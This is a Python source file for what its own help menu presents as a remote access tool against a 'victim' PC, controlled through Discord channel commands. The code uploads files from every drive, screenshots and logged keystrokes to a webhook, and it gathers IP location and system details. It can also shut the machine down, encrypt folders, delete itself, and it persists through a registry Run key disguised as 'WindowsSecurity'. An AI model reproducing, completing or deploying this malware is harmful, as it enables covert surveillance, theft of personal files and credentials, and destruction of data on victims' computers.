import os
import requests
import time
import threading
import datetime
from PIL import ImageGrab
import queue
from pynput import keyboard
import concurrent.futures
import sys
import psutil
import json
import winreg as reg
TOKEN = ""  
CHANNEL_ID = ""

def get_latest_command_message():
    url = f'https://discord.com/api/v10/channels/{CHANNEL_ID}/messages'
    headers = {'Authorization': f'Bot {TOKEN}'}

    response = requests.get(url, headers=headers)

    if response.status_code == 200:
        try:
            messages = response.json()
            latest_command_message = next((message for message in messages if message['content'].startswith('/')), None)
            return latest_command_message
        except Exception as e:
            print(f"Failed to parse JSON response: {e}")
            return None
    elif response.status_code == 429:
        retry_after = response.json().get('retry_after', 1) / 1000
        print(f"Rate limit exceeded - waiting for {retry_after} seconds")
        time.sleep(retry_after)
        return None
    else:
        print(f"Failed to fetch messages. Status code: {response.status_code}")
        print(response.json())
        return None

def massupload(webhook_url):
    WEBHOOK_URL = webhook_url
   
    BLACKLISTED_DIRS = ['C:\\Windows\\', 'C:\\Program Files\\', 'C:\\Program Files (x86)\\', 'C:\\$Recycle.Bin\\','C:\\AMD\\']
    def check_file(file_path):
        allowed_extensions = ['.txt', '.pdf', '.png', '.jpg', '.jpeg', '.gif','.mp4','.mp3','.py','.js','.mkv','.docx','.xls']
        max_size_mb = 8
        if os.path.splitext(file_path)[1].lower() not in allowed_extensions:
            print(f"Skipping file {file_path} - invalid file type")
            return False
        elif os.path.getsize(file_path) > max_size_mb * 1024 * 1024:
            print(f"Skipping file {file_path} - file size too large")
            return False
        elif os.path.isfile(file_path) and not os.access(file_path, os.R_OK):
            print(f"Skipping file {file_path} - file requires admin privileges")
            return False
        elif any(blacklisted_dir in file_path for blacklisted_dir in BLACKLISTED_DIRS):
            print(f"Skipping file {file_path} - in blacklisted directory")
            return False
        else:
            return True    
    def upload_file(file_path):
        try:
            with open(file_path, "rb") as f:
                files = {"file": f}
                headers = {"User-Agent": "Mozilla/5.0"} 
                response = requests.post(WEBHOOK_URL, headers=headers, files=files)
                if response.status_code == 429:
                    
                    print(f"Rate limit exceeded - waiting for {response.json()['retry_after']} seconds")
                    time.sleep(response.json()["retry_after"]/1000)
                    upload_file(file_path)
                elif response.status_code != 200:
                    print(f"Failed to upload file {file_path} - error {response.status_code}")
                else:
                    print(f"Successfully uploaded file {file_path}")
        except Exception as e:
            print(f"Failed to upload file {file_path} - {str(e)}")
    def search_files(root_dir):
        for root, dirs, files in os.walk(root_dir):
            if any(blacklisted_dir in root for blacklisted_dir in BLACKLISTED_DIRS):
                
                continue
            for file in files:
                file_path = os.path.join(root, file)
                if check_file(file_path):
                    upload_file(file_path)
    def thread_files(root_dirs):
        for root_dir in root_dirs:
            search_files(root_dir)
 
    drives = ["%s:\\" % d for d in "ABCDEFGHIJKLMNOPQRSTUVWXYZ" if os.path.exists("%s:" % d)]
    drive_groups = [drives[i:i+4] for i in range(0, len(drives), 4)]

    for group in drive_groups:
        threads = []
        for drive in group:
            thread = threading.Thread(target=search_files, args=(drive,))
            threads.append(thread)
            thread.start()

        for thread in threads:
            thread.join()

def webhook_upload(file_path, webhook_url):
    try:
        with open(file_path, 'rb') as file:
            files = {'file': (file_path, file)}
            headers = {"User-Agent": "Mozilla/5.0"}
            response = requests.post(webhook_url, headers=headers, files=files)
            if response.status_code == 429:
            
                print(f"Rate limit exceeded - waiting for {response.json()['retry_after']} seconds")
                time.sleep(response.json()["retry_after"] / 1000)
                webhook_upload(file_path, webhook_url)
            elif response.status_code != 200:
                print(f"Failed to upload file {file_path} - error {response.status_code}")
            else:
                print(f"Successfully uploaded file {file_path}")
    except Exception as e:
        
        print(f"Failed to upload file {file_path} - {str(e)}")

def take_screenshot(output_folder, webhook_url):
   
    if not os.path.exists(output_folder):
        os.makedirs(output_folder)

   
    timestamp = datetime.datetime.now().strftime('%Y%m%d%H%M%S')

   
    screenshot = ImageGrab.grab()

 
    screenshot_filename = os.path.join(output_folder, f'screenshot_{timestamp}.png')
    screenshot.save(screenshot_filename)

    print(f'Screenshot saved as "{screenshot_filename}"')

   
    webhook_upload(screenshot_filename, webhook_url)

    if os.path.exists(screenshot_filename):
        os.remove(screenshot_filename)
        print(f'Screenshot "{screenshot_filename}" deleted.')

def basic_info_network(webhook): 
    response = requests.get('http://icanhazip.com')
    ip = response.text.strip()
    info = requests.get(f"http://ip-api.com/json/{ip}?fields=66846719").json()

    embed = {
        "title": "Quick IP Info",
        "color": 0x00FF00,
        "fields": [
            {
                "name": "IP Address",
                "value": ip if ip else "Unknown",
                "inline": True
            },
            {
                "name": "Location",
                "value": f"{info['city']}, {info['regionName']}, {info['country']}",
                "inline": True
            },
            {
                "name": "ISP",
                "value": info['isp'] if info['isp'] else "Unknown",
                "inline": True
            },
            {
                "name": "AS Number",
                "value": info['as'] if info['as'] else "Unknown",
                "inline": True
            },
            {
                "name": "ASN Name",
                "value": info['asname'] if info['asname'] else "Unknown",
                "inline": True
            },
            {
                "name": "ORG",
                "value": info['org'] if info['org'] else "Unknown",
                "inline": True
            },
            {
                "name": "Reverse DNS",
                "value": info['reverse'] if info['reverse'] else "Unknown",
                "inline": True
            },
            {
                "name": "Mobile",
                "value": str(info['mobile']) if 'mobile' in info else "Unknown",
                "inline": True
            },
            {
                "name": "Proxy",
                "value": str(info['proxy']) if 'proxy' in info else "Unknown",
                "inline": True
            },
            {
                "name": "Hosting",
                "value": str(info['hosting']) if 'hosting' in info else "Unknown",
                "inline": True
            }
        ]
    }

    payload = {
        "username": "IP_API Info Grabber",
        "content": "Quick IP Info",
        "embeds": [embed]
    }

    headers = {"User-Agent": "Mozilla/5.0"}
    response = requests.post(webhook, headers=headers, json=payload)

def key_logger(webhook):
    keystroke_queue = queue.Queue()
    def send_requests():
        keystrokes = []
        while True:
            try:
                # Get a keystroke from the queue
                keystroke = keystroke_queue.get()
                if hasattr(keystroke, 'char'):
                    keystrokes.append(keystroke.char)
                elif hasattr(keystroke, 'name'):
                    keystrokes.append('<{}>'.format(keystroke.name))
                    # If the keystroke is a space, send the data to the webhook
                    if keystroke.name == 'space':
                        headers = {"User-Agent": "Mozilla/5.0"}
                        payload= {
                                    "username": "Keylogger",
                                    "content": ''.join(keystrokes)
                                }
                        response = requests.post(webhook,headers=headers,json=payload)
                        if response.status_code == 200 or response.status_code == 204:
                            keystrokes = []
                        elif response.status_code == 429:
                            time.sleep(response.json()["retry_after"]/1000)
                            response = requests.post(webhook,headers=headers,json=payload)
                        else:
                            break
                else:
                    continue
            except Exception as e:
                print('Error sending request:', e)

    # Start the thread for sending requests
    threading.Thread(target=send_requests, daemon=True).start()

    # Define function to handle keystrokeshelo 
    def on_press(key):
        try:
            
            keystroke_queue.put(key)
        except Exception as e:
            print('Error handling keystroke:', e)

    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

def hunt_upload(filepath,webhook): 
    try: 
        with open(filepath, 'rb') as f: 
            files = {"file": f}
            headers = {"User-Agent": "Mozilla/5.0"} 
            response = requests.post(webhook, headers=headers, files=files)
            if response.status_code == 429:
                
                print(f"Rate limit exceeded - waiting for {response.json()['retry_after']} seconds")
                time.sleep(response.json()["retry_after"]/1000)
                hunt_upload(filepath)
            elif response.status_code != 200:
                print(f"Failed to upload file {filepath} - error {response.status_code}")
            else:
                print(f"Successfully uploaded file {filepath}")
    except Exception as e:
        print(f"Failed to upload file {filepath} - {str(e)}")

def hunt_file(filename, webhook ,search_path='/', case_sensitive=True): 
    if not case_sensitive:
        filename = filename.lower()

    def search_in_directory(directory):
        for root, _, files in os.walk(directory):
            for file in files:
                if not case_sensitive:
                    file = file.lower()

                if file == filename:
                    return os.path.abspath(os.path.join(root, file))
        return None

    with concurrent.futures.ThreadPoolExecutor() as executor:
        drives = ['%s:/' % d for d in range(65, 91) if os.path.exists('%s:/' % chr(d))]

        search_tasks = [executor.submit(search_in_directory, os.path.join(drive, search_path)) for drive in drives]

        for task in concurrent.futures.as_completed(search_tasks):
            result = task.result()
            if result:
                print(result)
                hunt_upload(result,webhook)


    return None
    

def delete_self():
    try:
        script_path = os.path.abspath(sys.argv[0])
        os.remove(script_path)
        print(f"Self-deletion successful. The file '{script_path}' has been deleted.")
    except Exception as e:
        print(f"Failed to delete the script: {e}")

def sys_info(webhook_url): 
    def get_cpu_info():
        cpu_info = {
            "Physical Cores": psutil.cpu_count(logical=False),
            "Total Cores": psutil.cpu_count(logical=True),
            "Max Frequency": psutil.cpu_freq().max,
            "Min Frequency": psutil.cpu_freq().min,
            "Current Frequency": psutil.cpu_freq().current,
            "CPU Usage": psutil.cpu_percent(interval=1)
        }
        return cpu_info

    def get_memory_info():
        memory = psutil.virtual_memory()
        memory_info = {
            "Total Memory": memory.total,
            "Available Memory": memory.available,
            "Used Memory": memory.used,
            "Free Memory": memory.free,
            "Memory Percentage": memory.percent
        }
        return memory_info

    def get_disk_info():
        partitions = psutil.disk_partitions()
        disk_info = {}
        for partition in partitions:
            try:
                partition_usage = psutil.disk_usage(partition.mountpoint)
                disk_info[partition.device] = {
                    "Total Size": partition_usage.total,
                    "Used": partition_usage.used,
                    "Free": partition_usage.free,
                    "Percentage Used": partition_usage.percent
                }
            except PermissionError:
                continue
        return disk_info

    def get_network_info():
        network_info = psutil.net_if_addrs()
        return network_info

    def send_to_discord_webhook(webhook_url, system_specs):
        headers = {'Content-Type': 'application/json'}
        payload = {'content': system_specs}
        
        try:
            response = requests.post(webhook_url, data=json.dumps(payload), headers=headers)
            response.raise_for_status()
            print("System specifications sent successfully!")
        except requests.exceptions.RequestException as e:
            print(f"Failed to send system specifications: {e}")
    
    cpu_info = get_cpu_info()
    memory_info = get_memory_info()
    disk_info = get_disk_info()
    network_info = get_network_info()

    system_specs_str = "```"
    system_specs_str += "CPU Information:\n"
    for key, value in cpu_info.items():
        system_specs_str += f"{key}: {value}\n"

    system_specs_str += "\nMemory Information:\n"
    for key, value in memory_info.items():
        system_specs_str += f"{key}: {value}\n"

    system_specs_str += "\nDisk Information:\n"
    for device, specs in disk_info.items():
        system_specs_str += f"Device: {device}\n"
        for key, value in specs.items():
            system_specs_str += f"{key}: {value}\n"

    system_specs_str += "\nNetwork Information:\n"
    for interface, addresses in network_info.items():
        system_specs_str += f"Interface: {interface}\n"
        for addr in addresses:
            system_specs_str += f"  {addr.family.name}: {addr.address}\n"

    system_specs_str += "```"

    # Replace 'YOUR_WEBHOOK_URL' with your actual Discord webhook URL
    send_to_discord_webhook(webhook_url, system_specs_str)


def add_to_startup_windows():
    script_path = os.path.abspath(sys.argv[0])

    key = r"Software\Microsoft\Windows\CurrentVersion\Run"
    value_name = "WindowsSecurity"
    value_data = f'"{sys.executable}" "{script_path}"'

    try:
        key = reg.OpenKey(reg.HKEY_CURRENT_USER, key, 0, reg.KEY_SET_VALUE)
        reg.SetValueEx(key, value_name, 0, reg.REG_SZ, value_data)
        reg.CloseKey(key)
        print("Script added to Windows startup.")
    except Exception as e:
        print("Error adding script to Windows startup:", e)

def send_help(webhook_url): 
    embed = {
        "title": "Commands",
        "colour": 0x00FF00,
        "fields": [
            {
                "name": "/mass-upload",
                "value": "Uploads all files from a victims computer",
                "inline": True

            }, 
            {
                "name": "/screen-update",
                "value": "sends screenshot of victims screen",
                "inline": True
            },
            {
                "name": "/quick-info",
                "value": "gathers info based on ip-api",
                "inline": True
            },
            {
                "name":"/shutdown",
                "value":"shutsdown victims computer",
                "inline": True
            },
            {
                "name": "/keylogger",
                "value": "a keylogger (once started - does not stop till victims computer has been shutdown and turned back on, or restarted)",
                "inline": True
            },
            {
                "name":"/hunt",
                "value": "finds specified files u set and if found uploads them, ie: '/hunt example.docx'",
                "inline": True
            },
            {
                "name":"/kill",
                "value": "attampts to selfdestruct program - warning: If the porgram is placed in a folder or location protected by admin privledges  - this will not work.",
                "inline": True
            },
            {
                "name": "/system-info",
                "value": "shows info about the victims pc",
                "inline": True
            },
            {
                "name": "/help",
                "value": "Brings up this menu of options",
                "inline": True
            },
            {
                "name": "/encrypt",
                "value": 'encrypts specified directory on victims computer with a password u specify, ie: /encyrpt -p 12345 -f "C:\Users\<USERNAME>\Desktop", -p is the password flag, -f is the directory flag.',
                "inline": True
            },
            {
                "name": "/decrypt",
                "value": 'decrypts an encrypted folder (you would have had to have done this before) specified directory on victims computer with a password u specify, ie: /encyrpt -p 12345 -f "C:\Users\<USERNAME>\Desktop", -p is the password flag, -f is the directory flag."',
                "inline": True 
            },
        ]
    }
    payload = {
    "username": "Help Menu",
    "content": "Commands to be used",
    "embeds": [embed]
    }

    headers = {"User-Agent": "Mozilla/5.0"}
    response = requests.post(webhook_url, headers=headers, json=payload)

def encryption(pwd,path): 
    def xor_cipher(data, key):
        return bytes(b ^ key for b in data)

    def generate_key(password):
        key = 0
        for char in password:
            key ^= ord(char)
        return key
    
    def encrypt_file(file_path, password):
        with open(file_path, 'rb') as file:
            data = file.read()

        key = generate_key(password)
        encrypted_data = xor_cipher(data, key)

        encrypted_file_path = file_path + '.encrypted'

        with open(encrypted_file_path, 'wb') as encrypted_file:
            encrypted_file.write(encrypted_data)

        # Delete the original file after successful encryption
        os.remove(file_path)
    def encrypt_folder(path, pwd):
        for root, _, files in os.walk(path):
            for file in files:
                file_path = os.path.join(root, file)
                encrypt_file(file_path, pwd)
    
    encrypt_folder(path,pwd)

def decryption(pwd, path): 
    def xor_cipher(data, key):
        return bytes(b ^ key for b in data)

    def generate_key(password):
        key = 0
        for char in password:
            key ^= ord(char)
        return key

    def decrypt_file(encrypted_file_path, password):
        with open(encrypted_file_path, 'rb') as encrypted_file:
            data = encrypted_file.read()

        key = generate_key(password)
        decrypted_data = xor_cipher(data, key)

        decrypted_file_path = encrypted_file_path[:-10]

        with open(decrypted_file_path, 'wb') as decrypted_file:
            decrypted_file.write(decrypted_data)

        # Delete the encrypted file after successful decryption
        os.remove(encrypted_file_path)
    def decrypt_folder(path, pwd):
        for root, _, files in os.walk(path):
            for file in files:
                if file.endswith('.encrypted'):
                    file_path = os.path.join(root, file)
                    decrypt_file(file_path, pwd)
    
    decrypt_folder(path,pwd)


def parse_input(command_line, func):
    # Find the index of '-p' and '-f' in the input string
    index_p = command_line.find('-p')
    index_f = command_line.find('-f')

    if index_p != -1 and index_f != -1:
        # Extract the password and file location values
        password_start = index_p + 3
        password_end = command_line.find(' ', password_start)
        password = command_line[password_start:password_end]

        file_location_start = index_f + 3
        # Handle the case where the file location is enclosed within double quotes
        if command_line[file_location_start] == '"':
            file_location_start += 1
            file_location_end = command_line.find('"', file_location_start)
        else:
            file_location_end = command_line.find(' ', file_location_start)

        file_location = command_line[file_location_start:file_location_end]

        if func.lower() == "encrypt":
            encryption(password, file_location)
        elif func.lower() == "decrypt":
            decryption(password, file_location)
        else: 
            return None
    else:
        return None, None

def process_command(command):
    webhook_url = ""
    command_breakdown = command.split()
    
    if command_breakdown[0].lower() == "mass-upload":
        massupload(webhook_url)
    
    if command_breakdown[0].lower() == "screen-update": 
        output_folder = "/Documents/zeon/hunter/doom/regular"
        take_screenshot(output_folder, webhook_url)

    if command_breakdown[0].lower() == "quick-info": 
        basic_info_network(webhook_url)

    if command_breakdown[0].lower() == "shutdown":
        os.system("shutdown /s /t 1")    
    
    if command_breakdown[0].lower() == "keylogger": 
        key_logger(webhook_url)

    if command_breakdown[0].lower() == "hunt": 
        command_breakdown.remove(command_breakdown[0])
        hunted_file = ' '.join(command_breakdown)
        hunt_file(filename=hunted_file,webhook=webhook_url)

    if command_breakdown[0].lower() == "kill":
       delete_self()

    if command_breakdown[0].lower() == "system-info":
        sys_info(webhook_url)
    
    if command_breakdown[0].lower() == "help": 
        send_help(webhook_url)
    
    if command_breakdown[0].lower() == "encrypt":
        command_line = rf'{command}'
        parse_input(command_line,func="encrypt")

    if command_breakdown[0].lower() == "decrypt":
        command_line = rf'{command}'
        parse_input(command_line,func="decrypt")
    

if __name__ == '__main__':
    last_message_id = None
    add_to_startup_windows()
    while True:
        latest_command_message = get_latest_command_message()
        time.sleep(3)
        if latest_command_message and latest_command_message['id'] != last_message_id:
            last_message_id = latest_command_message['id']
            command = latest_command_message['content'][1:]
            process_command(command)

